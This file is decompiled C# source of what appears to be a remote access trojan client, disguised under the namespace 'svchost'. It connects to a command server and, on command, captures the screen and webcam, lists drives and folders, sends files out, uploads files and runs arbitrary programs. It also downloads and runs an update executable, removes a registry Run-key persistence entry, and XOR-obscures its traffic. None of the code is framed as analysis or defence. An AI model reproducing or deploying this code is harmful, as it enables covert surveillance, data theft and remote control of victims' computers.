using System;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace svchost;

public class CommsClass
{
	public static string ClientID;

	private TcpClient CommsClient;

	private NetworkStream CommsStream;

	private byte[] SendBytes;

	public static bool ComConnected;

	public static bool CamActive;

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetDriveTypeA([MarshalAs(UnmanagedType.VBByRefStr)] ref string nDrive);

	[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
	private static extern int GetVolumeInformationA([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpRootPathName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpVolumeNameBuffer, long nVolumeNameSize, long lpVolumeSerialNumber, long lpMaximumComponentLength, long lpFileSystemFlags, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpFileSystemNameBuffer, long nFileSystemNameSize);

	public void Go()
	{
		Thread.Sleep(1000);
		try
		{
			CommsClient = new TcpClient();
			CommsClient.Connect(Form1.ServerIP, 32510);
			CommsStream = CommsClient.GetStream();
			ComConnected = true;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return;
		}
		while (true)
		{
			try
			{
				string text = RxMessage();
				if (text.StartsWith("Message\u0002"))
				{
					ShowMessage(text);
				}
				if (text.StartsWith("EndComms"))
				{
					EndComms();
				}
				if (text.StartsWith("Identify"))
				{
					SendClientName();
				}
				if (text.StartsWith("Terminate"))
				{
					Terminate();
				}
				if (text.StartsWith("Destroy"))
				{
					Destroy();
				}
				if (text.StartsWith("GetDrives"))
				{
					SendDrives();
				}
				if (text.StartsWith("ScreenCap"))
				{
					SendScreenCap();
				}
				if (text.StartsWith("WebCam"))
				{
					WebCam();
				}
				if (text.StartsWith("FolderList\u0002"))
				{
					SendFolderList(text);
				}
				if (text.StartsWith("Download\u0002"))
				{
					SendFile(text);
				}
				if (text.StartsWith("Preview\u0002"))
				{
					Preview(text);
				}
				if (text.StartsWith("Search\u0002"))
				{
					Search(text);
				}
				if (text.StartsWith("Rename\u0002"))
				{
					RenameClient(text);
				}
				if (text.StartsWith("Run\u0002"))
				{
					RunProg(text);
				}
				if (text.StartsWith("Upload\u0002"))
				{
					Upload(text);
				}
				if (text.StartsWith("UpdateClient\u0002"))
				{
					UpdateClient(text);
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			if (!Form1.Connected | !ComConnected)
			{
				break;
			}
			Application.DoEvents();
			Thread.Sleep(10);
		}
		try
		{
			CommsStream.Close();
			CommsClient.Close();
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	public void Upload(string Info)
	{
		checked
		{
			try
			{
				string[] array = Info.Split(new char[1] { '\u0002' });
				string path = array[1];
				string text = array[2];
				TcpClient tcpClient = new TcpClient();
				tcpClient.NoDelay = true;
				tcpClient.Connect(Form1.ServerIP, 32515);
				NetworkStream stream = tcpClient.GetStream();
				FileStream fileStream = default(FileStream);
				try
				{
					fileStream = new FileStream(path, FileMode.Create, FileAccess.Write);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					SendMessage("Upload failed - file access problem");
					stream.Close();
					tcpClient.Close();
					ProjectData.ClearProjectError();
				}
				byte[] buffer = new byte[tcpClient.ReceiveBufferSize + 1];
				DateTime now = DateTime.Now;
				long num2 = default(long);
				while (true)
				{
					try
					{
						int num = stream.Read(buffer, 0, tcpClient.ReceiveBufferSize);
						num2 += num;
						if (num == 0)
						{
							if (StringType.StrCmp(num2.ToString(), text, false) == 0)
							{
								break;
							}
							if (DateTime.Now.Subtract(now).TotalSeconds > 10.0)
							{
								SendMessage("Upload Failed");
								tcpClient.Close();
								stream.Close();
								fileStream.Close();
								return;
							}
							goto IL_013b;
						}
						now = DateTime.Now;
						fileStream.Write(buffer, 0, num);
						goto IL_013b;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						tcpClient.Close();
						stream.Close();
						fileStream.Close();
						ProjectData.ClearProjectError();
						goto IL_013b;
					}
					IL_013b:
					Thread.Sleep(1);
					Application.DoEvents();
				}
				tcpClient.Close();
				stream.Close();
				fileStream.Close();
				SendMessage("Upload Completed");
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void UpdateClient(string UpdateLength)
	{
		Thread.Sleep(1000);
		Application.DoEvents();
		checked
		{
			try
			{
				UpdateLength = UpdateLength.Replace("UpdateClient\u0002", "");
				TcpClient tcpClient = new TcpClient();
				tcpClient.NoDelay = true;
				tcpClient.Connect(Form1.ServerIP, 32515);
				NetworkStream stream = tcpClient.GetStream();
				FileStream fileStream = default(FileStream);
				try
				{
					fileStream = new FileStream(Form1.UserDir + "temp.exe", FileMode.Create, FileAccess.Write);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					SendMessage("Update failed - file access problem");
					stream.Close();
					tcpClient.Close();
					ProjectData.ClearProjectError();
				}
				byte[] buffer = new byte[tcpClient.ReceiveBufferSize + 1];
				DateTime now = DateTime.Now;
				long num2 = default(long);
				while (true)
				{
					try
					{
						int num = stream.Read(buffer, 0, tcpClient.ReceiveBufferSize);
						num2 += num;
						if (num == 0)
						{
							if (StringType.StrCmp(num2.ToString(), UpdateLength, false) == 0)
							{
								break;
							}
							if (DateTime.Now.Subtract(now).TotalSeconds > 10.0)
							{
								SendMessage("Update Failed");
								tcpClient.Close();
								stream.Close();
								fileStream.Close();
								return;
							}
							goto IL_014a;
						}
						now = DateTime.Now;
						fileStream.Write(buffer, 0, num);
						goto IL_014a;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						tcpClient.Close();
						stream.Close();
						fileStream.Close();
						ProjectData.ClearProjectError();
						goto IL_014a;
					}
					IL_014a:
					Thread.Sleep(1);
					Application.DoEvents();
				}
				tcpClient.Close();
				stream.Close();
				fileStream.Close();
				SendMessage("Update Completed");
				Process process = new Process();
				process.StartInfo.FileName = Form1.UserDir + "temp.exe";
				process.Start();
				ProjectData.EndApp();
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				ProjectData.ClearProjectError();
			}
		}
	}

	public void Terminate()
	{
		try
		{
			SendMessage("Terminating");
			Thread.Sleep(2000);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ProjectData.EndApp();
	}

	public void EndComms()
	{
		try
		{
			SendMessage("EndedComms");
			Thread.Sleep(2000);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		ComConnected = false;
	}

	public void Destroy()
	{
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\run", writable: true);
			registryKey.DeleteValue("MShelp", throwOnMissingValue: true);
			SendMessage("Destroyed");
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			try
			{
				SendMessage("Poo");
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				ProjectData.ClearProjectError();
			}
			ProjectData.ClearProjectError();
		}
	}

	public void RenameClient(string cName)
	{
		try
		{
			cName = cName.Replace("Rename\u0002", "");
			StreamWriter streamWriter = new StreamWriter(Form1.ProgramDir + "nm.dat", append: false);
			streamWriter.WriteLine(cName);
			Form1.ClientID = cName;
			streamWriter.Close();
			SendMessage("ok");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void RunProg(string Rprog)
	{
		try
		{
			Rprog = Rprog.Replace("Run\u0002", "");
			Process process = new Process();
			process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
			process.StartInfo.FileName = Rprog;
			process.Start();
			Process.Start(Rprog);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void ShowMessage(string Message)
	{
		try
		{
			Message = Message.Replace("Message\u0002", "");
			ClientMessageBox clientMessageBox = new ClientMessageBox();
			ClientMessageBox.Message = Message;
			Thread thread = new Thread(clientMessageBox.ShowMessage);
			thread.IsBackground = true;
			thread.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public void SendClientName()
	{
		try
		{
			StreamReader streamReader = new StreamReader(Form1.ProgramDir + "nm.dat");
			string text = streamReader.ReadLine();
			streamReader.Close();
			if (StringType.StrCmp(text, "", false) != 0)
			{
				SendMessage(text + "\u0002" + Environment.UserName.ToString() + "\u0002" + 123);
			}
			else
			{
				SendMessage("NoName\u0002" + Environment.UserName.ToString() + "\u0002" + 123);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			SendMessage("NoName\u0002" + Environment.UserName.ToString() + "\u0002" + 123);
			ProjectData.ClearProjectError();
		}
	}

	public void SendFile(string FileName)
	{
		try
		{
			FileName = FileName.Replace("Download\u0002", "");
			if (File.Exists(FileName))
			{
				try
				{
					new FileStream(FileName, FileMode.Open, FileAccess.Read);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					SendMessage("Error");
					ProjectData.ClearProjectError();
					return;
				}
				FileInfo fileInfo = new FileInfo(FileName);
				SendMessage(fileInfo.Length.ToString());
				RxMessage();
				SendMessage("ok");
				Uploader uploader = new Uploader();
				Uploader.File = FileName;
				Thread thread = new Thread(uploader.Upload);
				thread.IsBackground = true;
				thread.Start();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private ImageCodecInfo GetEncoderInfo(string mimeType)
	{
		ImageCodecInfo result = default(ImageCodecInfo);
		try
		{
			ImageCodecInfo[] imageEncoders = ImageCodecInfo.GetImageEncoders();
			int length = imageEncoders.Length;
			int num = 0;
			while (true)
			{
				if (num <= length)
				{
					if (StringType.StrCmp(imageEncoders[num].get_MimeType(), mimeType, false) == 0)
					{
						break;
					}
					num = checked(num + 1);
					continue;
				}
				result = null;
				return result;
			}
			result = imageEncoders[num];
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public void Preview(string FileName)
	{
		//IL_0019: Unknown result type (might be due to invalid IL or missing references)
		//IL_0020: Expected O, but got Unknown
		//IL_0021: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_003c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0042: Expected O, but got Unknown
		checked
		{
			try
			{
				MemoryStream memoryStream = new MemoryStream();
				FileName = FileName.Replace("Preview\u0002", "");
				Bitmap val = new Bitmap(FileName);
				EncoderParameters val2 = new EncoderParameters(1);
				val2.get_Param()[0] = new EncoderParameter(Encoder.Quality, 10L);
				ImageCodecInfo encoderInfo = GetEncoderInfo("image/jpeg");
				memoryStream = new MemoryStream();
				((Image)val).Save((Stream)memoryStream, encoderInfo, val2);
				((Image)val).Dispose();
				byte[] array = new byte[(int)(memoryStream.Length - 1L) + 1];
				memoryStream.Seek(0L, SeekOrigin.Begin);
				memoryStream.Read(array, 0, (int)memoryStream.Length);
				memoryStream.Close();
				SendMessage(array.Length.ToString());
				RxMessage();
				SendMessage("ok");
				Preview preview = new Preview();
				svchost.Preview.abyte = array;
				Thread thread = new Thread(preview.SendPreview);
				thread.IsBackground = true;
				thread.Start();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				SendMessage("Error");
				ProjectData.ClearProjectError();
			}
		}
	}

	public void SendFolderList(string Folder)
	{
		Folder = Folder.Replace("FolderList\u0002", "");
		try
		{
			DirectoryInfo directoryInfo = new DirectoryInfo(Folder);
			FileSystemInfo[] directories = directoryInfo.GetDirectories("*.*");
			SendMessage("<..>\u0002-\u0002");
			int num = Information.UBound((Array)directories, 1);
			for (int i = 0; i <= num; i = checked(i + 1))
			{
				SendMessage("<" + directories[i].Name.ToString() + ">" + "\u0002" + "-" + "\u0002");
			}
			FileInfo[] files = directoryInfo.GetFiles();
			FileInfo[] array = files;
			foreach (FileInfo fileInfo in array)
			{
				try
				{
					SendMessage(fileInfo.get_Name() + "\u0002" + fileInfo.Length + "\u0002");
					Thread.Sleep(1);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			SendMessage("<..>\u0002Access Denied\u0002");
			ProjectData.ClearProjectError();
		}
		SendMessage("\u0004");
	}

	public void Search(string Params)
	{
		SendMessage("ok");
		Searcher searcher = new Searcher();
		Searcher.Params = Params;
		Thread thread = new Thread(searcher.Search);
		thread.IsBackground = true;
		thread.Start();
	}

	public void WebCam()
	{
		WebcamViewer webcamViewer = new WebcamViewer();
		Thread thread = new Thread(webcamViewer.Go);
		thread.IsBackground = true;
		thread.Start();
	}

	public void SendScreenCap()
	{
		SendMessage("ok");
		SpyComScreenCap spyComScreenCap = new SpyComScreenCap();
		Thread thread = new Thread(spyComScreenCap.ScreenCap);
		thread.IsBackground = true;
		thread.Start();
	}

	public void SendDrives()
	{
		try
		{
			string[] logicalDrives = Environment.GetLogicalDrives();
			int num = Information.UBound((Array)logicalDrives, 1);
			long lpVolumeSerialNumber = default(long);
			long lpMaximumComponentLength = default(long);
			long lpFileSystemFlags = default(long);
			for (int i = 0; i <= num; i = checked(i + 1))
			{
				string text = "WTF IS THIS?";
				if (GetDriveTypeA(ref logicalDrives[i]) == 0)
				{
					text = "UNKNOWN";
				}
				if (GetDriveTypeA(ref logicalDrives[i]) == 1)
				{
					text = "INVALID";
				}
				if (GetDriveTypeA(ref logicalDrives[i]) == 2)
				{
					text = "REMOVABLE";
				}
				if (GetDriveTypeA(ref logicalDrives[i]) == 3)
				{
					text = "FIXED";
				}
				if (GetDriveTypeA(ref logicalDrives[i]) == 4)
				{
					text = "NETWORK";
				}
				if (GetDriveTypeA(ref logicalDrives[i]) == 5)
				{
					text = "CDROM (Present)";
					string lpVolumeNameBuffer = Strings.Space(127);
					string lpFileSystemNameBuffer = Strings.Space(127);
					long num2 = GetVolumeInformationA(ref logicalDrives[i], ref lpVolumeNameBuffer, 127L, lpVolumeSerialNumber, lpMaximumComponentLength, lpFileSystemFlags, ref lpFileSystemNameBuffer, 127L);
					if (num2 == 0L)
					{
						text = " CDROM (Empty)";
					}
				}
				if (GetDriveTypeA(ref logicalDrives[i]) == 6)
				{
					text = "RAMDISK";
				}
				SendMessage(logicalDrives[i] + "\u0002" + text + "\u0002");
			}
			SendMessage("\u0004");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private string RxMessage()
	{
		checked
		{
			byte[] array = new byte[CommsClient.ReceiveBufferSize + 1];
			string text = default(string);
			try
			{
				string text2 = default(string);
				do
				{
					if (CommsStream.DataAvailable)
					{
						int num = CommsStream.Read(array, 0, CommsClient.ReceiveBufferSize);
						string @string = Encoding.Default.GetString(array);
						if (num > 0)
						{
							text += @string.Substring(0, num);
							if (Strings.Chr(Strings.Asc(text.Substring(text.Length - 1, 1)) ^ 0xFF) == '\u0003')
							{
								int num2 = text.Length - 1;
								for (int i = 0; i <= num2; i++)
								{
									text2 += StringType.FromChar(Strings.Chr(Strings.Asc(text.Substring(i, 1)) ^ 0xFF));
								}
								text = text2;
								if (!text.ToString().StartsWith("\u0001\u0002") || !text.EndsWith("\u0003"))
								{
									text = "";
								}
								break;
							}
						}
					}
					Application.DoEvents();
					Thread.Sleep(1);
				}
				while (!(!Form1.Connected | !ComConnected));
				text = text.Replace("\u0001\u0002", "");
				text = text.Replace("\u0003", "");
				return text;
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
				return text;
			}
		}
	}

	public void SendMessage(string Message)
	{
		checked
		{
			lock (this)
			{
				try
				{
					if (StringType.StrCmp(Message, "", false) != 0)
					{
						Message = "\u0001\u0002" + Message;
						Message += "\u0003";
					}
					int num = Message.Length - 1;
					string text = default(string);
					for (int i = 0; i <= num; i++)
					{
						text += StringType.FromChar(Strings.Chr(Strings.Asc(Message.Substring(i, 1)) ^ 0xFF));
					}
					SendBytes = Encoding.Default.GetBytes(text);
					CommsStream.Write(SendBytes, 0, SendBytes.Length);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ComConnected = false;
					ProjectData.ClearProjectError();
				}
			}
		}
	}
}
